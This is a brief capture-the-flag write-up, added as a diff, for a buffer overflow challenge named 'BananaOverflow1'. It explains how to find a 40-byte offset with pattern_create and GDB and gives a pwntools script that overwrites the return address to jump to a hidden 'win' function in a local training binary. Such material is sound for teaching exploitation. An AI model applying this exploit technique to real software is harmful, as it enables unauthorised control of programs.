@@ -1,0 +1,15 @@
+Simple Bufferoverflow question
+
+Step 1) Use a tool such as pattern_create and GDB to crash the program and then determine the RSP offset. Buffer size should be determined to be 40.
+Step 2) Send the exploit! Can be done by entering it but easiest way is to use pwntools to pack it all together. p.sendline(b"A" * 40 + p64(e.sym['you_better_not_hack_me_and_take_my_banana']))
+
+Solution Script:
+
+from pwn import *
+
+e = ELF('BananaOverflow1')
+p = e.process()
+
+p.sendline(b"A" * 40 + p64(e.sym['you_better_not_hack_me_and_take_my_banana']))
+# this is a local execution solve
+p.interactive()
